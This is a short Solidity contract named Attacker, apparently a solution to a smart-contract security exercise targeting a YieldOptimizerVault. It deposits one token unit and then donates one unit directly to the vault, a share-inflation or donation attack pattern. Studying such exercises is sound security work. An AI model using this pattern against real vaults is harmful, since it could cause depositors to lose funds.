// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {YieldOptimizerVault} from "src/effective-altruist/YieldOptimizerVault.sol";

contract Attacker {

    IERC20 private immutable _token;

    YieldOptimizerVault private immutable _yieldOptimizerVault;

    constructor(YieldOptimizerVault _vault, IERC20 __token) {
        _yieldOptimizerVault = _vault;
        _token = __token;
    }

    function executeAttack() external {

        _token.approve(address(_yieldOptimizerVault), 1);
        _yieldOptimizerVault.deposit(1, address(this));

        _token.transfer(address(_yieldOptimizerVault), 1);
    }
}